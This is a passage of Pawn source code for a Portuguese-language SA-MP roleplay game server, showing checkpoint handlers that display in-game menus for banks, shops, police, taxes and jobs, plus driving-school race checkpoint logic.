	    SendClientMessage(playerid, 0xFFFFFFAA, " Caso já tenha uma conta bancária digite: '/Banco'");
		SendClientMessage(playerid, AZUL_WE, " Banco Central ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, cCaixas[0]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[1]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[2]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[3]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[4]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[5]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[6]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[7]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[8]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[9]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[10]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[11]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[12]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[13]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[14]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[15]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[16]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[17]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[18]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[19]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[20]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[21]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[22]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[23]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[24]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[25]) ||
	IsPlayerInDynamicCP(playerid, cCaixas[26]))
	{
		SendClientMessage(playerid, AZUL_WE, "Caixa  Eletrônico ");
		SendClientMessage(playerid, -1, " Para acessar sua conta bancária, digite '/Caixa' e efetue a operação desejada");
		SendClientMessage(playerid, AZUL_WE, "Caixa  Eletrônico ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_9))
	{
	    if(pInfo[playerid][Prof] == MAQUINISTA)
	    {
			SendClientMessage(playerid, AZUL_WE, " Área Maquista ");
		    SendClientMessage(playerid, 0xFFFFFFAA, " Caso você esteja para saída e inicio de viagem digite: '/SairEstacao'");
		    SendClientMessage(playerid, 0xFFFFFFAA, " Caso você esteja na chegada final digite: '/ChegadaFinal'");
			SendClientMessage(playerid, AZUL_WE, " Área Maquista ");
			return 1;
		}
	}
	if(IsPlayerInDynamicCP(playerid, CP_10))
	{
	    if(pInfo[playerid][Prof] == MAQUINISTA)
	    {
			SendClientMessage(playerid, AZUL_WE, "Área Maquista Las Venturas ");
		    SendClientMessage(playerid, 0xFFFFFFAA, " Estação de Las Venturas - Confirme sua chegada digite: '/ChegadaLV'");
			SendClientMessage(playerid, AZUL_WE, "Área Maquista Las Venturas ");
			return 1;
		}
	}
	if(IsPlayerInDynamicCP(playerid, CP_11))
	{
	    if(pInfo[playerid][Prof] == MAQUINISTA)
	    {
			SendClientMessage(playerid, AZUL_WE, "Área Maquista San Fierro ");
		    SendClientMessage(playerid, 0xFFFFFFAA, " Estação de San Fierro - Confirme sua chegada digite: '/ChegadaSF'");
			SendClientMessage(playerid, AZUL_WE, "Área Maquista San Fierro ");
			return 1;
		}
	}
	if(IsPlayerInDynamicCP(playerid, CP_13))
	{
	    if(pInfo[playerid][Prof] == FOTOGRAFO)
	    {
 			SendClientMessage(playerid, AZUL_WE, " Agência de Fotógrafos ");
		    SendClientMessage(playerid, 0xFFFFFFAA, " Para vender suas fotografias digite: '/VenderFotos'");
			SendClientMessage(playerid, AZUL_WE, " Agência de Fotógrafos ");
			return 1;
	    }
	}
	if(IsPlayerInDynamicCP(playerid, CP_5))
	{
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}BINCO{1E90FF} ");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para efetuar a compra de uma roupa, use: {1E90FF}/Skin");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um óculos, use: {1E90FF}/Oculos");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir uma máscara, use: {1E90FF}/Mascara");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um chapéu, use: {1E90FF}/Chapeu");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para remover seus acessórios, use: {1E90FF}/RemoverItens");
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}BINCO{1E90FF} ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_41))
	{
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}ZIP{1E90FF} ");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para efetuar a compra de uma roupa, use: {1E90FF}/Skin");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um óculos, use: {1E90FF}/Oculos");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir uma máscara, use: {1E90FF}/Mascara");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um chapéu, use: {1E90FF}/Chapeu");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para remover seus acessórios, use: {1E90FF}/RemoverItens");
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}ZIP{1E90FF} ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_42))
	{
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}VICTIM{1E90FF} ");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para efetuar a compra de uma roupa, use: {1E90FF}/Skin");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um óculos, use: {1E90FF}/Oculos");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir uma máscara, use: {1E90FF}/Mascara");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um chapéu, use: {1E90FF}/Chapeu");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para remover seus acessórios, use: {1E90FF}/RemoverItens");
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}VICTIM{1E90FF} ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_43))
	{
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}TRAIN HARD & PRO-LAPS{1E90FF} ");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para efetuar a compra de uma roupa, use: {1E90FF}/Skin");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um óculos, use: {1E90FF}/Oculos");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir uma máscara, use: {1E90FF}/Mascara");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um chapéu, use: {1E90FF}/Chapeu");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para remover seus acessórios, use: {1E90FF}/RemoverItens");
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}TRAIN HARD & PRO-LAPS{1E90FF} ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_44))
	{
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}DIDIERSACHS{1E90FF} ");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para efetuar a compra de uma roupa, use: {1E90FF}/Skin");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um óculos, use: {1E90FF}/Oculos");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir uma máscara, use: {1E90FF}/Mascara");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um chapéu, use: {1E90FF}/Chapeu");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para remover seus acessórios, use: {1E90FF}/RemoverItens");
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}DIDIERSACHS{1E90FF} ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_45))
	{
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}SUB-URBAN{1E90FF} ");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para efetuar a compra de uma roupa, use: {1E90FF}/Skin");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um óculos, use: {1E90FF}/Oculos");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir uma máscara, use: {1E90FF}/Mascara");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para adquirir um chapéu, use: {1E90FF}/Chapeu");
        SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}Para remover seus acessórios, use: {1E90FF}/RemoverItens");
		SendClientMessage(playerid, 0x1E90FFFF, " {FFFFFF}SUB-URBAN{1E90FF} ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_3))
	{
        SendClientMessage(playerid, AZUL_WE, " Loja de Utilitários ");
        SendClientMessage(playerid, 0xFFFFFFAA, " Para abrir o menu de utilitários digite: '/Utilitarios'");
        SendClientMessage(playerid, AZUL_WE, " Loja de Utilitários ");
        return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_14) || IsPlayerInDynamicCP(playerid, CP_15) || IsPlayerInDynamicCP(playerid, CP_46) || IsPlayerInDynamicCP(playerid, CP_47) || IsPlayerInDynamicCP(playerid, CP_48) || IsPlayerInDynamicCP(playerid, CP_49) || IsPlayerInDynamicCP(playerid, CP_50))
	{
        SendClientMessage(playerid, VERMELHO_WE, " Hospital ");
        SendClientMessage(playerid, AZUL_WE, " Para abrir o menu de serviços do Hospital, use: '/Hospital'");
        SendClientMessage(playerid, VERMELHO_WE, " Hospital ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_16))
	{
        SendClientMessage(playerid, AZUL_WE, " Favela ");
        SendClientMessage(playerid, 0xFFFFFFAA, " Conjunto de armas usáveis na favela, para comprá-las, use: '/ArmasFavela'");
        SendClientMessage(playerid, AZUL_WE, " Favela ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_2))
	{
	    SendClientMessage(playerid, AZUL_WE, " Auto Escola ");
	    SendClientMessage(playerid, 0xFFFFFFAA, " Escolha a licença que deseja comprar, digite '/Licencas'");
	    SendClientMessage(playerid, AZUL_WE, " Auto Escola ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_29))
	{
		SendClientMessage(playerid, AZUL_WE, " Ficha Criminal ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para remover seu nome da lista criminal digite: '/LimparFicha'");
	 	SendClientMessage(playerid, 0xFFFFFFAA, " Cada crime custa R$5.000 para ser removido da sua ficha criminal.");
		SendClientMessage(playerid, AZUL_WE, " Ficha Criminal ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_17))
	{
	    if(pInfo[playerid][Prof] == TRANSPORTADOR)
	    {
	        SendClientMessage(playerid, AZUL_WE, " Agência de Entrega de Transportes ");
	        SendClientMessage(playerid, 0xFFFFFFAA, " Para entregar a mercadoria digite: '/eMercadoria'");
	        SendClientMessage(playerid, AZUL_WE, " Agência de Entrega de Transportes ");
	        return 1;
        }
	}
	if(IsPlayerInDynamicCP(playerid, CP_22))
	{
	    if(pInfo[playerid][Prof] == TRANSPORTADOR)
	    {
	        SendClientMessage(playerid, AZUL_WE, " Agência de Entrega de Transportes ");
	        SendClientMessage(playerid, 0xFFFFFFAA, " Para receber a taxa das entregas use: '/mComprovantes'");
	        SendClientMessage(playerid, AZUL_WE, " Agência de Entrega de Transportes ");
	        return 1;
        }
	}
	if(IsPlayerInDynamicCP(playerid, CP_23)) // preef
	{
		SendClientMessage(playerid, AZUL_WE, " Impostos Prefeitura ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para ver suas dívidas de impostos digite: '/Dividas'");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para ver quantos impostos atrasados digite: '/ImpostosAtrasados'");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para pagar seus impostos digite: '/PagarImpostos'");
		SendClientMessage(playerid, AZUL_WE, " Impostos Prefeitura ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_35)) // preef
	{
		SendClientMessage(playerid, AZUL_WE, " Impostos ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para ver suas dívidas de impostos digite: '/Dividas'");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para ver quantos impostos atrasados digite: '/ImpostosAtrasados'");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para pagar seus impostos digite: '/PagarImpostos'");
		SendClientMessage(playerid, AZUL_WE, " Impostos ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_4))
	{
	    SendClientMessage(playerid, AZUL_WE, " Loteria ");
	    SendClientMessage(playerid, 0xFFFFFFAA, " Para fazer uma aposta digite: '/Apostar [Número]'");
	    SendClientMessage(playerid, 0xFFFFFFAA, " Para ver se à prêmio acumulado digite: '/Acumulados'");
	    SendClientMessage(playerid, AZUL_WE, " Loteria ");
	    return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_24))
	{
		SendClientMessage(playerid, AZUL_WE, " Delegacia ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para comprar porte de armas digite: '/ComprarPorte'");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para pagar a fiança de alguém digite: '/PagarFianca'");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para ver os jogadores presos digite: '/Presos'");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para ver os jogadores procurados digite: '/Procurados'");
		SendClientMessage(playerid, AZUL_WE, " Delegacia ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_25))
	{
		SendClientMessage(playerid, VERMELHO_WE, " Ammunation ");
		SendClientMessage(playerid, AZUL_WE, " Bem-vindo a Ammunation, use '/Armas' ou '/Treinar' para aumentar suas habilidades.");
		SendClientMessage(playerid, COR_ERRO, " ATENÇÃO! {FFFFFF}Ao morrer, você perderá todas as suas armas fora do inventário!");
		SendClientMessage(playerid, VERMELHO_WE, " Ammunation ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_51))
	{
		SendClientMessage(playerid, AZUL_WE, " Área de Contrabando ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para comprar bombas use: '/ComprarBomba'");
		SendClientMessage(playerid, AZUL_WE, " Área de Contrabando ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_52))
	{
	    if(getPolicial(playerid))
	    {
			SendClientMessage(playerid, AZUL_WE, " Guarita ");
			SendClientMessage(playerid, 0xFFFFFFAA, " Para subir use: '/Guarita'");
			SendClientMessage(playerid, AZUL_WE, " Guarita ");
			return 1;
		}
	}
	if(IsPlayerInDynamicCP(playerid, CP_53))
	{
	    if(getPolicial(playerid))
	    {
			SendClientMessage(playerid, AZUL_WE, " Refeitório ");
			SendClientMessage(playerid, 0xFFFFFFAA, " Use '/Refeicao' para comer e beber");
			SendClientMessage(playerid, AZUL_WE, " Refeitório ");
			return 1;
		}
	}
	if(IsPlayerInDynamicCP(playerid, CP_54))
	{
	    if(getPolicial(playerid))
	    {
			SendClientMessage(playerid, AZUL_WE, " Pátio ");
			SendClientMessage(playerid, 0xFFFFFFAA, " Use 'F' ou '/Sair' para ir ao pátio");
			SendClientMessage(playerid, AZUL_WE, " Pátio ");
			return 1;
		}
	}
	if(IsPlayerInDynamicCP(playerid, CP_55))
	{
	    if(getPolicial(playerid))
	    {
			SendClientMessage(playerid, AZUL_WE, " Prisão ");
			SendClientMessage(playerid, 0xFFFFFFAA, " Use 'F' ou '/Entrar' para entrar na prisão");
			SendClientMessage(playerid, AZUL_WE, " Prisão ");
			return 1;
		}
	}
	if(IsPlayerInDynamicCP(playerid, CP_56) || IsPlayerInDynamicCP(playerid, CP_57) || IsPlayerInDynamicCP(playerid, CP_58) || IsPlayerInDynamicCP(playerid, CP_59) || IsPlayerInDynamicCP(playerid, CP_60))
	{
		SendClientMessage(playerid, AZUL_WE, " Bebedouro ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para beber água use: '/Beber'");
		SendClientMessage(playerid, AZUL_WE, " Bebedouro ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_22))
	{
		SendClientMessage(playerid, AZUL_WE, " Área de Mercadoria ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Para mostrar os comprovamentes use: '/mComprovantes'");
		SendClientMessage(playerid, AZUL_WE, " Área de Mercadoria ");
		return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_30))
	{
	    if(IsPlayerInAnyVehicle(playerid) && pInfo[playerid][Prof] == 3)
	    {
			SendClientMessage(playerid, AZUL_WE, " Área de Mototorista de Ônibus ");
			SendClientMessage(playerid, 0xFFFFFFAA, " Para dar partida em sua rota digite: '/IniciarRota'");
			SendClientMessage(playerid, AZUL_WE, " Área de Mototorista de Ônibus ");
			return 1;
		}
	}
	if(IsPlayerInDynamicCP(playerid, CP_12))
	{
	    // Fazenda da Dorgas Definir
	    return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_37))
	{
	    SendClientMessage(playerid, AZUL_WE, " Presidência {FF1E1E}W{1E90FF}E ");
	    format(gStr, sizeof(gStr), " Presidênte atual: %s", WE_GetString("Eleitos.ini", "Presidente"));
		SendClientMessage(playerid, 0xFFFFFFAA, gStr);
	    SendClientMessage(playerid, 0xFFFFFFAA, " /Presidente - Para conferir o(a) presidente atual.");
	    SendClientMessage(playerid, 0xFFFFFFAA, " /Candidatarse - Para se candidatar à presidência da república.");
	    SendClientMessage(playerid, 0xFFFFFFAA, " /Eleitos - Para conferir a lista de eleitos.");
	    SendClientMessage(playerid, 0xFFFFFFAA, " /Votar - Para votar em algum eleito(a).");
	    SendClientMessage(playerid, AZUL_WE, " Presidência {FF1E1E}W{1E90FF}E ");
	    return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_12))
	{
	    SendClientMessage(playerid, AZUL_WE, " Fazenda das Drogas ");
	    SendClientMessage(playerid, 0xFFFFFFAA, " /PegarDroga - Para pegar 1kg de droga.");
	    SendClientMessage(playerid, AZUL_WE, " Fazenda das Drogas ");
	    return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_39))
	{
	    if(pInfo[playerid][Prof] == BOMBEIRO || aInfo[playerid][Admin] == 1)
	    {
		    SendClientMessage(playerid, AZUL_WE, " Corpo de Bombeiros ");
		    SendClientMessage(playerid, 0xFFFFFFAA, " /ProximoIncendio - Para ir apagar um novo incêndio.");
		    SendClientMessage(playerid, 0xFFFFFFAA, " /BaixaIncendio - Para dar baixa de um incêndio apagado. *");
		    SendClientMessage(playerid, AZUL_WE, " Corpo de Bombeiros ");
	    }
	    return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_40))
	{
	    GameTextForPlayer(playerid, "~y~~h~Para pegar a mercadoria~n~Digite:~n~~w~/mercadoria", 1000, 5);
	    return 1;
	}
	return 1;
}
// Final CP

public OnPlayerLeaveCheckpoint(playerid)
{
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	switch(Checks[playerid])
	{

		case 1:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[1][0], AutoPoints[1][1], AutoPoints[1][2],AutoPoints[2][0], AutoPoints[2][1], AutoPoints[2][2], 7);
			Checks[playerid] = 2;
			return 1;
		}
		case 2:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[2][0], AutoPoints[2][1], AutoPoints[2][2],AutoPoints[3][0], AutoPoints[3][1], AutoPoints[3][2], 7);
			Checks[playerid] = 3;
			return 1;
		}
		case 3:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[3][0], AutoPoints[3][1], AutoPoints[3][2],AutoPoints[4][0], AutoPoints[4][1], AutoPoints[4][2], 7);
			Checks[playerid] = 4;
			return 1;
		}
		case 4:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[4][0], AutoPoints[4][1], AutoPoints[4][2],AutoPoints[5][0], AutoPoints[5][1], AutoPoints[5][2], 7);
			Checks[playerid] = 5;
			return 1;
		}
		case 5:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[5][0], AutoPoints[5][1], AutoPoints[5][2],AutoPoints[6][0], AutoPoints[6][1], AutoPoints[6][2], 7);
			Checks[playerid] = 6;
			return 1;
		}
		case 6:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[6][0], AutoPoints[6][1], AutoPoints[6][2],AutoPoints[7][0], AutoPoints[7][1], AutoPoints[7][2], 7);
			Checks[playerid] = 7;
			return 1;
		}
		case 7:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[7][0], AutoPoints[7][1], AutoPoints[7][2],AutoPoints[8][0], AutoPoints[8][1], AutoPoints[8][2], 7);
			Checks[playerid] = 8;
			return 1;
		}
		case 8:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[8][0], AutoPoints[8][1], AutoPoints[8][2],AutoPoints[9][0], AutoPoints[9][1], AutoPoints[9][2], 7);
			Checks[playerid] = 9;
			return 1;
		}
		case 9:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[9][0], AutoPoints[9][1], AutoPoints[9][2],AutoPoints[10][0], AutoPoints[10][1], AutoPoints[10][2], 7);
			Checks[playerid] = 10;
			return 1;
		}
		case 10:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[10][0], AutoPoints[10][1], AutoPoints[10][2],AutoPoints[11][0], AutoPoints[11][1], AutoPoints[11][2], 7);
			Checks[playerid] = 11;
			return 1;
		}
		case 11:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[11][0], AutoPoints[11][1], AutoPoints[11][2],AutoPoints[12][0], AutoPoints[12][1], AutoPoints[12][2], 7);
			Checks[playerid] = 12;
			return 1;
		}
		case 12:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[12][0], AutoPoints[12][1], AutoPoints[12][2],AutoPoints[13][0], AutoPoints[13][1], AutoPoints[13][2], 7);
			Checks[playerid] = 13;
			return 1;
		}
		case 13:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[13][0], AutoPoints[13][1], AutoPoints[13][2],AutoPoints[14][0], AutoPoints[14][1], AutoPoints[14][2], 7);
			Checks[playerid] = 14;
			return 1;
		}
		case 14:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[14][0], AutoPoints[14][1], AutoPoints[14][2],AutoPoints[15][0], AutoPoints[15][1], AutoPoints[15][2], 7);
			Checks[playerid] = 15;
			return 1;
		}
		case 15:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[15][0], AutoPoints[15][1], AutoPoints[15][2],AutoPoints[16][0], AutoPoints[16][1], AutoPoints[16][2], 7);
			Checks[playerid] = 16;
			return 1;
		}
		case 16:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints[16][0], AutoPoints[16][1], AutoPoints[16][2],AutoPoints[17][0], AutoPoints[17][1], AutoPoints[17][2], 7);
			Checks[playerid] = 17;
			return 1;
		}
		case 17:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid, 1, AutoPoints[17][0], AutoPoints[17][1], AutoPoints[17][2],AutoPoints[17][0], AutoPoints[17][1], AutoPoints[17][2], 7);
			Checks[playerid] = 18;
			return 1;
		}
		case 18:
		{

			if(IsPlayerInVehicle(playerid, carroauto[playerid]))
			{

				new Float:lataria;
				GetVehicleHealth(carroauto[playerid], lataria);
				if(lataria < 900)
				{

					DisablePlayerRaceCheckpoint(playerid);
					new currentveh;
					currentveh = GetPlayerVehicleID(playerid);
					DestroyVehicle(currentveh);
					SendClientMessage(playerid, COR_ERRO,"Reprovado. Você danificou o veículo e não passou no teste!");
					return 1;
				}
				DisablePlayerRaceCheckpoint(playerid);
				GameTextForPlayer(playerid, "APROVADO!", 3000, 1);
				pInfo[playerid][HabTMoto] = 1;
				SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
				SetPlayerInterior(playerid, 3);
				pInfo[playerid][EntrouL] = true;
				WE_SetInt(gFile, "HabTMoto", 1);
				WE_SaveFile();
				InAutoEscola[playerid] = 0;
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				return 1;
			}
			else
			{

				DisablePlayerRaceCheckpoint(playerid);
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				SendClientMessage(playerid,COR_ERRO,"Reprovado. Você não está no veículo da Auto-Escola!");
				return 1;
			}
		}
	}
	switch(Checks2[playerid])
	{

		case 1:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[1][0], AutoPoints2[1][1], AutoPoints2[1][2],AutoPoints2[2][0], AutoPoints2[2][1], AutoPoints2[2][2], 7);
			Checks2[playerid] = 2;
			return 1;
		}
		case 2:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[2][0], AutoPoints2[2][1], AutoPoints2[2][2],AutoPoints2[3][0], AutoPoints2[3][1], AutoPoints2[3][2], 7);
			Checks2[playerid] = 3;
			return 1;
		}
		case 3:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[3][0], AutoPoints2[3][1], AutoPoints2[3][2],AutoPoints2[4][0], AutoPoints2[4][1], AutoPoints2[4][2], 7);
			Checks2[playerid] = 4;
			return 1;
		}
		case 4:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[4][0], AutoPoints2[4][1], AutoPoints2[4][2],AutoPoints2[5][0], AutoPoints2[5][1], AutoPoints2[5][2], 7);
			Checks2[playerid] = 5;
			return 1;
		}
		case 5:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[5][0], AutoPoints2[5][1], AutoPoints2[5][2],AutoPoints2[6][0], AutoPoints2[6][1], AutoPoints2[6][2], 7);
			Checks2[playerid] = 6;
			return 1;
		}
		case 6:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[6][0], AutoPoints2[6][1], AutoPoints2[6][2],AutoPoints2[7][0], AutoPoints2[7][1], AutoPoints2[7][2], 7);
			Checks2[playerid] = 7;
			return 1;
		}
		case 7:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[7][0], AutoPoints2[7][1], AutoPoints2[7][2],AutoPoints2[8][0], AutoPoints2[8][1], AutoPoints2[8][2], 7);
			Checks2[playerid] = 8;
			return 1;
		}
		case 8:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[8][0], AutoPoints2[8][1], AutoPoints2[8][2],AutoPoints2[9][0], AutoPoints2[9][1], AutoPoints2[9][2], 7);
			Checks2[playerid] = 9;
			return 1;
		}
		case 9:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[9][0], AutoPoints2[9][1], AutoPoints2[9][2],AutoPoints2[10][0], AutoPoints2[10][1], AutoPoints2[10][2], 7);
			Checks2[playerid] = 10;
			return 1;
		}
		case 10:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[10][0], AutoPoints2[10][1], AutoPoints2[10][2],AutoPoints2[11][0], AutoPoints2[11][1], AutoPoints2[11][2], 7);
			Checks2[playerid] = 11;
			return 1;
		}
		case 11:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[11][0], AutoPoints2[11][1], AutoPoints2[11][2],AutoPoints2[12][0], AutoPoints2[12][1], AutoPoints2[12][2], 7);
			Checks2[playerid] = 12;
			return 1;
		}
		case 12:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[12][0], AutoPoints2[12][1], AutoPoints2[12][2],AutoPoints2[13][0], AutoPoints2[13][1], AutoPoints2[13][2], 7);
			Checks2[playerid] = 13;
			return 1;
		}
		case 13:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[13][0], AutoPoints2[13][1], AutoPoints2[13][2],AutoPoints2[14][0], AutoPoints2[14][1], AutoPoints2[14][2], 7);
			Checks2[playerid] = 14;
